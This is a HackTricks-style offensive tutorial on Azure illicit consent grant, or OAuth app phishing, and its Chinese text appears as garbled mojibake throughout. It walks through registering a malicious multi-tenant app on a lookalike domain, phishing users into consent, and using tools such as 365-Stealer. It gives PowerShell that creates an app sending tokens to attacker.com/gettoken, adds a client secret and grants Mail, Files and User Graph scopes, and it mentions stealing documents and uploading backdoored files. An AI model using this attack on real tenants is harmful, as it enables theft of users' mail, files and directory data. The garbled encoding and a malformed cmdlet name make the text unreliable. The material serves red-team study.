# Az - éæ³•åŒæ„æˆäºˆ

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## OAuthåº”ç”¨ç¨‹åºé’“é±¼

**Azureåº”ç”¨ç¨‹åº** è¯·æ±‚æƒé™ä»¥è®¿é—®**ç”¨æˆ·æ•°æ®**ï¼ˆåŸºæœ¬ä¿¡æ¯ï¼Œä½†ä¹ŸåŒ…æ‹¬è®¿é—®æ–‡æ¡£ï¼Œå‘é€ç”µå­é‚®ä»¶ç­‰ï¼‰ã€‚\
å¦‚æœ**å…è®¸**ï¼Œæ™®é€šç”¨æˆ·åªèƒ½å¯¹**"ä½å½±å“"æƒé™**æˆäºˆåŒæ„ã€‚åœ¨**æ‰€æœ‰å…¶ä»–**æƒ…å†µä¸‹ï¼Œ**éœ€è¦ç®¡ç†å‘˜åŒæ„**ã€‚\
`GA`ã€`ApplicationAdministrator`ã€`CloudApplication` `Administrator`å’ŒåŒ…æ‹¬`æˆäºˆæƒé™ç»™åº”ç”¨ç¨‹åºçš„æƒé™`çš„è‡ªå®šä¹‰è§’è‰²å¯ä»¥æä¾›ç§Ÿæˆ·èŒƒå›´çš„åŒæ„ã€‚

åªæœ‰**ä¸éœ€è¦ç®¡ç†å‘˜åŒæ„**çš„æƒé™è¢«å½’ç±»ä¸º**ä½å½±å“**ã€‚è¿™äº›æƒé™æ˜¯**åŸºæœ¬ç™»å½•æ‰€éœ€çš„openid, profile, email, User.Readå’Œoffline\_access**ã€‚å¦‚æœä¸€ä¸ª**ç»„ç»‡** **å…è®¸**ç”¨æˆ·åŒæ„**æ‰€æœ‰åº”ç”¨ç¨‹åº**ï¼Œå‘˜å·¥å¯ä»¥æˆæƒä¸€ä¸ªåº”ç”¨ç¨‹åº**ä»ä»–ä»¬çš„ä¸ªäººèµ„æ–™ä¸­è¯»å–ä¸Šè¿°ä¿¡æ¯**ã€‚

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å‡†å¤‡ä¸€ä¸ª**æ¶æ„åº”ç”¨ç¨‹åº**ï¼Œå¹¶é€šè¿‡**é’“é±¼**ï¼Œä½¿ç”¨æˆ·**æ¥å—è¯¥åº”ç”¨ç¨‹åºå¹¶çªƒå–ä»–çš„æ•°æ®**ã€‚

### æ£€æŸ¥ç”¨æˆ·æ˜¯å¦è¢«å…è®¸åŒæ„

æ£€æŸ¥ç”¨æˆ·æ˜¯å¦è¢«å…è®¸åŒæ„åº”ç”¨ç¨‹åºï¼š

{% code overflow="wrap" %}
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
{% endcode %}

* **ç¦ç”¨ç”¨æˆ·åŒæ„**ï¼šç”¨æˆ·ä¸èƒ½æˆæƒåº”ç”¨ç¨‹åºæƒé™ã€‚
* **ç”¨æˆ·å¯ä»¥åŒæ„æ¥è‡ªç»è¿‡éªŒè¯çš„å‘å¸ƒè€…æˆ–æ‚¨çš„ç»„ç»‡çš„åº”ç”¨ç¨‹åºï¼Œä½†ä»…é™äºæ‚¨é€‰æ‹©çš„æƒé™**ï¼šæ‰€æœ‰ç”¨æˆ·åªèƒ½åŒæ„é‚£äº›ç”±ç»è¿‡éªŒè¯çš„å‘å¸ƒè€…å‘å¸ƒçš„åº”ç”¨ç¨‹åºä»¥åŠåœ¨æ‚¨çš„ç§Ÿæˆ·ä¸­æ³¨å†Œçš„åº”ç”¨ç¨‹åºã€‚
* **ç”¨æˆ·å¯ä»¥åŒæ„æ‰€æœ‰åº”ç”¨ç¨‹åº**ï¼šå…è®¸æ‰€æœ‰ç”¨æˆ·åŒæ„ä»»ä½•ä¸éœ€è¦ç®¡ç†å‘˜åŒæ„çš„æƒé™ã€‚
* **è‡ªå®šä¹‰åº”ç”¨ç¨‹åºåŒæ„ç­–ç•¥**

## **ä»€ä¹ˆæ˜¯éæ³•åŒæ„æˆäºˆæ”»å‡»ï¼Ÿ**

åœ¨éæ³•åŒæ„æˆäºˆæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…åˆ›å»ºä¸€ä¸ª**Azureæ³¨å†Œçš„åº”ç”¨ç¨‹åºï¼Œè¯·æ±‚è®¿é—®æ•°æ®ï¼Œå¦‚è”ç³»ä¿¡æ¯ã€ç”µå­é‚®ä»¶æˆ–æ–‡æ¡£**ã€‚ç„¶åï¼Œæ”»å‡»è€…è¯±éª—ç»ˆç«¯ç”¨æˆ·æˆäºˆåº”ç”¨ç¨‹åºåŒæ„ï¼Œä»¥ä¾¿æ”»å‡»è€…èƒ½å¤Ÿè®¿é—®ç›®æ ‡ç”¨æˆ·å¯ä»¥è®¿é—®çš„æ•°æ®ã€‚åº”ç”¨ç¨‹åºè¢«æˆäºˆåŒæ„åï¼Œå®ƒå¯ä»¥åœ¨ä¸éœ€è¦ç»„ç»‡è´¦æˆ·çš„æƒ…å†µä¸‹ä»¥ç”¨æˆ·è´¦æˆ·çº§åˆ«è®¿é—®æ•°æ®ã€‚

ç®€å•æ¥è¯´ï¼Œå½“å—å®³è€…ç‚¹å‡»é‚£ä¸ªç¾ä¸½çš„è“è‰²â€œæ¥å—â€æŒ‰é’®æ—¶ï¼ŒAzure ADä¼šå‘å±äºæ”»å‡»è€…çš„ç¬¬ä¸‰æ–¹ç½‘ç«™å‘é€ä¸€ä¸ªä»¤ç‰Œï¼Œæ”»å‡»è€…å°†ä½¿ç”¨è¯¥ä»¤ç‰Œä»£è¡¨å—å®³è€…æ‰§è¡Œæ“ä½œï¼Œå¦‚è®¿é—®æ‰€æœ‰æ–‡ä»¶ã€é˜…è¯»é‚®ä»¶ã€å‘é€é‚®ä»¶ç­‰ã€‚

## **æ”»å‡»æµç¨‹**

<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

ä¸ºäº†å¯¹å…¬å¸â€œecorpâ€å‘èµ·è¿™ç§æ”»å‡»ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å†Œä¸€ä¸ªåä¸ºâ€œsafedomainlogin.comâ€çš„åŸŸåï¼Œå¹¶åˆ›å»ºäº†ä¸€ä¸ªå­åŸŸå["ecorp.safedomainlogin.com"](http://ecorp.safedomainlogin.com/)ï¼Œåœ¨é‚£é‡Œä»–ä»¬**æ‰˜ç®¡åº”ç”¨ç¨‹åºä»¥æ•è·æˆæƒç **ï¼Œç„¶åè¯·æ±‚è®¿é—®ä»¤ç‰Œã€‚

ç„¶åï¼Œåœ¨ä»–ä»¬çš„Azure ADç§Ÿæˆ·ä¸­æ³¨å†Œä¸€ä¸ªå¤šç§Ÿæˆ·åº”ç”¨ç¨‹åºï¼Œå¹¶å°†å…¶å‘½åä¸ºâ€œecorpâ€ï¼Œæ·»åŠ äº†æŒ‡å‘â€œecorp.safedomainlogin.comâ€çš„é‡å®šå‘URLï¼Œè¯¥URLæ‰˜ç®¡ä¸€ä¸ªåº”ç”¨ç¨‹åºä»¥æ•è·æˆæƒç ã€‚

æ”»å‡»è€…è¿˜åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯å¯†é’¥ï¼Œå¹¶åœ¨åº”ç”¨ç¨‹åºä¸­æ·»åŠ äº†ä¸€äº›API**æƒé™**ï¼Œå¦‚`Mail.Read`ã€`Notes.Read.All`ã€`Files.ReadWrite.All`ã€`User.ReadBasic.All`ã€`User.Read`ã€‚è¿™æ ·ä¸€æ—¦**ç”¨æˆ·æˆäºˆåº”ç”¨ç¨‹åºåŒæ„**ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä»£è¡¨ç”¨æˆ·**æå–**æ•æ„Ÿä¿¡æ¯ã€‚

æ”»å‡»è€…æœ€ç»ˆåˆ›å»ºäº†åŒ…å«æ¶æ„åº”ç”¨ç¨‹åºå®¢æˆ·ç«¯IDçš„**é“¾æ¥**ï¼Œå¹¶**åˆ†äº«**ç»™**ç›®æ ‡ç”¨æˆ·**ä»¥è·å¾—ä»–ä»¬çš„åŒæ„ã€‚

## 365-Stealer

æ‚¨å¯ä»¥ä½¿ç”¨[**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)æ‰§è¡Œæ­¤æ”»å‡»ã€‚

ä½œä¸ºé¢å¤–æ­¥éª¤ï¼Œå¦‚æœæ‚¨å¯¹å—å®³ç»„ç»‡ä¸­çš„æŸä¸ªç”¨æˆ·æœ‰ä¸€äº›**è®¿é—®æƒé™**ï¼Œæ‚¨å¯ä»¥æ£€æŸ¥ç­–ç•¥æ˜¯å¦å…è®¸ä»–**æ¥å—åº”ç”¨ç¨‹åº**ï¼š
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy", he can
```
ä¸ºäº†è¿›è¡Œè¿™æ¬¡æ”»å‡»ï¼Œä½ éœ€è¦åœ¨ä½ çš„Azureç§Ÿæˆ·ä¸­**åˆ›å»ºä¸€ä¸ªæ–°çš„åº”ç”¨**ï¼ˆåœ¨åº”ç”¨æ³¨å†Œä¸­ï¼‰ï¼Œä¾‹å¦‚ï¼Œå…·æœ‰ä»¥ä¸‹æƒé™ï¼š

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` ä½äº `Microsoft Graph` çš„ `Delegated permissions` ä¸­ã€‚ï¼ˆåº”ç”¨ç¨‹åºæƒé™æ€»æ˜¯éœ€è¦é¢å¤–æ‰¹å‡†ï¼‰ã€‚

* `User.ReadBasic.All` æ˜¯ä¸€ä¸ªæƒé™ï¼Œå¦‚æœè¢«æˆæƒï¼Œå®ƒå°†å…è®¸ä½ **è¯»å–ç»„ç»‡ä¸­æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯**ã€‚
* è®°ä½ï¼Œåªæœ‰ `GA`ã€`ApplicationAdministrator`ã€`CloudApplication` `Administrator` å’ŒåŒ…æ‹¬`æˆäºˆåº”ç”¨ç¨‹åºæƒé™çš„æƒé™`çš„è‡ªå®šä¹‰è§’è‰²å¯ä»¥æä¾›ç§Ÿæˆ·èŒƒå›´çš„åŒæ„ã€‚å› æ­¤ï¼Œå¦‚æœä½ æƒ³è®©ä»–æ‰¹å‡†ä¸€ä¸ª**éœ€è¦ç®¡ç†å‘˜åŒæ„çš„åº”ç”¨**ï¼Œä½ åº”è¯¥**é’“é±¼ä¸€ä¸ªæ‹¥æœ‰è¿™äº›è§’è‰²ä¹‹ä¸€çš„ç”¨æˆ·**ã€‚

ä½ ä¹Ÿå¯ä»¥é€šè¿‡cliåˆ›å»ºä¸€ä¸ªåº”ç”¨ï¼Œä½¿ç”¨ï¼š

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
```markdown
{% endcode %}

æŸ¥çœ‹ [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) å­¦ä¹ å¦‚ä½•é…ç½®å®ƒã€‚

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œè·å¾—çš„**è®¿é—®ä»¤ç‰Œ**å°†ç”¨äºå…·æœ‰ä»¥ä¸‹èŒƒå›´çš„**graphç«¯ç‚¹**ï¼š`User.Read` å’Œ `User.ReadBasic.All`ï¼ˆè¯·æ±‚çš„æƒé™ï¼‰ã€‚æ‚¨å°†æ— æ³•æ‰§è¡Œå…¶ä»–æ“ä½œï¼ˆä½†è¿™äº›è¶³ä»¥**ä¸‹è½½ç»„ç»‡ä¸­æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯**ï¼‰ã€‚
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªå·¥å…·æ¥æ‰§è¡Œè¿™ä¸ªæ”»å‡»ã€‚

## åæœŸåˆ©ç”¨

ä¸€æ—¦æ‚¨è·å¾—äº†ç”¨æˆ·çš„è®¿é—®æƒé™ï¼Œæ‚¨å¯ä»¥åšä¸€äº›äº‹æƒ…ï¼Œä¾‹å¦‚çªƒå–æ•æ„Ÿæ–‡æ¡£ï¼Œç”šè‡³ä¸Šä¼ å¸¦åé—¨çš„æ–‡æ¡£æ–‡ä»¶ã€‚

## å‚è€ƒèµ„æ–™

* æœ¬æ–‡æ‘˜è‡ª [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
```
